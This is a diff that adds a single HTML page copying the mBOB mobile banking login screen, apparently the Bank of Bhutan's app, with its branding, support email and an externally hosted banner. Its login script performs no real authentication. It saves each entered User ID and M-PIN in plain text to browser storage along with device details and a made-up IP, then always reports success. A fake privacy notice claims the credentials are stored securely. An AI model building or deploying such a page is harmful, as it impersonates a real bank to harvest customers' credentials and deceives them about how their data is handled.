@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>mBOB Mobile Banking</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+      background: #ffffff;
+      color: #1a1a1a;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    /* ===== TOP NAVIGATION ===== */
+    .top-nav {
+      background: #0788bd;
+      color: #ffffff;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-shrink: 0;
+      z-index: 10;
+      position: relative;
+    }
+    .top-nav .menu-icon {
+      font-size: 28px;
+      cursor: pointer;
+      line-height: 1;
+      background: none;
+      border: none;
+      color: #fff;
+      padding: 4px 8px;
+      border-radius: 6px;
+      transition: background 0.2s;
+    }
+    .top-nav .menu-icon:hover {
+      background: rgba(255,255,255,0.15);
+    }
+    .top-nav .right-icons {
+      display: flex;
+      gap: 20px;
+      font-size: 24px;
+    }
+    .top-nav .right-icons span {
+      cursor: pointer;
+      padding: 4px 6px;
+      border-radius: 6px;
+      transition: background 0.2s;
+    }
+    .top-nav .right-icons span:hover {
+      background: rgba(255,255,255,0.15);
+    }
+    .top-nav .right-icons a {
+      color: #fff;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+    }
+
+    /* ===== MAIN CONTENT ===== */
+    .main-content {
+      flex: 1;
+      overflow-y: auto;
+      padding: 20px 8% 10px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ===== BRAND ===== */
+    .brand {
+      text-align: center;
+      margin: 10px 0 25px;
+    }
+    .brand .logo {
+      font-size: 48px;
+      font-weight: 700;
+      letter-spacing: -3px;
+      color: #1a1a1a;
+    }
+    .brand .logo .m {
+      font-weight: 400;
+      color: #0788bd;
+    }
+    .brand .logo .b {
+      color: #0a9dd1;
+    }
+    .brand .sub {
+      font-size: 12px;
+      letter-spacing: 5px;
+      color: #666;
+      margin-top: 3px;
+      font-weight: 500;
+    }
+
+    /* ===== LANGUAGE TOGGLE ===== */
+    .lang-toggle {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 25px;
+      font-size: 15px;
+      color: #333;
+      margin-bottom: 25px;
+      font-weight: 500;
+    }
+    .lang-toggle .switch {
+      width: 56px;
+      height: 28px;
+      background: #ccc;
+      border-radius: 30px;
+      position: relative;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .lang-toggle .switch.active {
+      background: #079acb;
+    }
+    .lang-toggle .switch:after {
+      content: "";
+      position: absolute;
+      width: 22px;
+      height: 22px;
+      background: #ffffff;
+      border-radius: 50%;
+      left: 3px;
+      top: 3px;
+      transition: 0.3s;
+    }
+    .lang-toggle .switch.active:after {
+      left: 31px;
+    }
+
+    /* ===== LOGIN FORM ===== */
+    .login-form {
+      max-width: 400px;
+      margin: 0 auto;
+      flex-shrink: 0;
+    }
+    .form-group {
+      margin-bottom: 24px;
+      border-bottom: 2px solid #78bdcf;
+      position: relative;
+    }
+    .form-group input {
+      width: 100%;
+      border: none;
+      outline: none;
+      font-size: 20px;
+      padding: 10px 0 8px;
+      color: #1a1a1a;
+      background: transparent;
+      font-weight: 400;
+    }
+    .form-group input::placeholder {
+      color: #aaa;
+      font-weight: 300;
+    }
+    .form-group .forgot-link {
+      position: absolute;
+      right: 0;
+      bottom: 8px;
+      font-size: 17px;
+      color: #269ab9;
+      cursor: pointer;
+      text-decoration: none;
+      font-weight: 400;
+    }
+    .form-group .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    .btn-login {
+      display: block;
+      width: 100%;
+      max-width: 280px;
+      margin: 8px auto 0;
+      background: #08a2d5;
+      color: #ffffff;
+      border: none;
+      border-radius: 30px;
+      padding: 13px 0;
+      font-size: 19px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+      letter-spacing: 0.5px;
+    }
+    .btn-login:hover {
+      background: #0690be;
+    }
+    .btn-login:active {
+      transform: scale(0.98);
+    }
+
+    /* ===== SUCCESS MESSAGE ===== */
+    .success-msg {
+      background: #d4edda;
+      color: #155724;
+      padding: 10px 14px;
+      border-radius: 10px;
+      margin-top: 14px;
+      text-align: center;
+      font-size: 14px;
+      font-weight: 500;
+      display: none;
+    }
+    .success-msg.show {
+      display: block;
+    }
+
+    /* ===== BANNER IMAGE ===== */
+    .banner-container {
+      flex: 1;
+      display: flex;
+      align-items: flex-end;
+      justify-content: center;
+      padding: 10px 0 5px;
+      min-height: 80px;
+    }
+    .banner-container img {
+      width: 100%;
+      max-width: 500px;
+      height: auto;
+      display: block;
+      border-radius: 12px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+    }
+
+    /* ===== SIMPLE FOOTER LINKS ===== */
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      padding: 8px 20px 10px;
+      flex-shrink: 0;
+      border-top: 1px solid #f0f0f0;
+      background: #fff;
+      flex-wrap: wrap;
+    }
+    .footer-links a {
+      color: #6c757d;
+      text-decoration: none;
+      font-size: 12px;
+      font-weight: 500;
+      transition: color 0.2s;
+      padding: 4px 8px;
+    }
+    .footer-links a:hover {
+      color: #0788bd;
+      text-decoration: underline;
+    }
+    .footer-links .sep {
+      color: #dde1e5;
+      font-weight: 300;
+    }
+
+    @media (max-width: 600px) {
+      .main-content { padding: 15px 5% 8px; }
+      .brand .logo { font-size: 40px; }
+      .brand .sub { font-size: 10px; letter-spacing: 3px; }
+      .lang-toggle { font-size: 13px; gap: 18px; margin-bottom: 20px; }
+      .form-group input { font-size: 18px; }
+      .form-group .forgot-link { font-size: 15px; }
+      .btn-login { font-size: 17px; padding: 12px 0; max-width: 100%; }
+      .banner-container { padding: 5px 0 3px; min-height: 60px; }
+      .banner-container img { border-radius: 8px; }
+      .footer-links { gap: 10px; padding: 6px 12px 8px; }
+      .footer-links a { font-size: 11px; padding: 3px 6px; }
+      .footer-links .sep { display: none; }
+    }
+
+    @media (max-width: 400px) {
+      .brand .logo { font-size: 34px; }
+      .form-group input { font-size: 16px; }
+      .btn-login { font-size: 16px; padding: 11px 0; }
+    }
+  </style>
+</head>
+<body>
+  <!-- ===== TOP NAVIGATION ===== -->
+  <div class="top-nav">
+    <button class="menu-icon" onclick="goHome()">☰</button>
+    <div class="right-icons">
+      <a href="mailto:support@bob.bt" title="Email Support">
+        <span>✉</span>
+      </a>
+      <span>☎</span>
+    </div>
+  </div>
+
+  <!-- ===== MAIN CONTENT ===== -->
+  <div class="main-content">
+    <!-- Brand -->
+    <div class="brand">
+      <div class="logo">
+        <span class="m">m</span>BO<span class="b">B</span>
+      </div>
+      <div class="sub">MOBILE BANKING</div>
+    </div>
+
+    <!-- Language Toggle -->
+    <div class="lang-toggle">
+      <span>English</span>
+      <div class="switch" id="langSwitch" onclick="toggleLanguage()"></div>
+      <span>བོད་ཡིག</span>
+    </div>
+
+    <!-- Login Form -->
+    <div class="login-form">
+      <div class="form-group">
+        <input type="text" id="loginUserId" placeholder="Enter User ID" autocomplete="off">
+        <span class="forgot-link" onclick="forgotUserId()">Forgot</span>
+      </div>
+      <div class="form-group">
+        <input type="password" id="loginPin" inputmode="numeric" maxlength="6" placeholder="M-PIN" autocomplete="off">
+        <span class="forgot-link" onclick="forgotPin()">Forgot</span>
+      </div>
+      <button class="btn-login" onclick="handleLogin()">Login</button>
+      
+      <div id="loginSuccess" class="success-msg"></div>
+    </div>
+
+    <!-- Banner Image -->
+    <div class="banner-container">
+      <img src="https://i.postimg.cc/3wTkpstp/IMG-20260908-095801-957.jpg" alt="mBOB Banner" loading="lazy">
+    </div>
+  </div>
+
+  <!-- ===== SIMPLE FOOTER LINKS ===== -->
+  <div class="footer-links">
+    <a href="#" onclick="goHome()">🏠 Home</a>
+    <span class="sep">|</span>
+    <a href="#" onclick="showPrivacy()">🔒 Privacy Policy</a>
+    <span class="sep">|</span>
+    <a href="mailto:support@bob.bt">✉ support@bob.bt</a>
+  </div>
+
+  <script>
+    // ===== HOME =====
+    function goHome() {
+      document.getElementById('loginUserId').value = '';
+      document.getElementById('loginPin').value = '';
+      document.getElementById('loginSuccess').classList.remove('show');
+      alert('🏠 Back to Home');
+    }
+
+    // ===== PRIVACY POLICY =====
+    function showPrivacy() {
+      alert(
+        '🔒 Privacy Policy\n\n' +
+        'Your privacy is important to us.\n\n' +
+        '• Your login credentials are stored securely\n' +
+        '• We do not share your data with third parties\n' +
+        '• All transactions are encrypted\n' +
+        '• You can clear your data anytime from settings\n\n' +
+        'For more details, contact: support@bob.bt'
+      );
+    }
+
+    // ===== LANGUAGE TOGGLE =====
+    function toggleLanguage() {
+      document.getElementById('langSwitch').classList.toggle('active');
+    }
+
+    // ===== FORGOT HANDLERS =====
+    function forgotUserId() {
+      alert('📞 Please contact support at support@bob.bt for User ID assistance.');
+    }
+    function forgotPin() {
+      alert('📞 Please contact support at support@bob.bt for M-PIN reset.');
+    }
+
+    // ===== LOGIN HANDLER =====
+    function handleLogin() {
+      const userId = document.getElementById('loginUserId').value.trim();
+      const pin = document.getElementById('loginPin').value.trim();
+
+      if (!userId || !pin) {
+        alert('Please enter both User ID and M-PIN.');
+        return;
+      }
+
+      if (pin.length < 4 || pin.length > 6) {
+        alert('M-PIN must be 4-6 digits.');
+        return;
+      }
+
+      const now = new Date();
+      const timeStr = now.toLocaleString('en-US', { hour12: true });
+
+      const logins = JSON.parse(localStorage.getItem('mBobLogins') || '[]');
+      logins.push({
+        userId: userId,
+        pin: pin,
+        status: 'success',
+        time: timeStr,
+        device: navigator.userAgent || 'Unknown',
+        ip: '192.168.1.' + Math.floor(Math.random() * 255)
+      });
+      localStorage.setItem('mBobLogins', JSON.stringify(logins));
+
+      const successEl = document.getElementById('loginSuccess');
+      successEl.textContent = '✅ Login successful! Welcome ' + userId;
+      successEl.classList.add('show');
+
+      document.getElementById('loginPin').value = '';
+
+      setTimeout(() => successEl.classList.remove('show'), 3000);
+    }
+
+    // ===== INIT =====
+    document.addEventListener('DOMContentLoaded', function() {
+      document.getElementById('langSwitch').classList.remove('active');
+    });
+  </script>
+</body>
+</html>
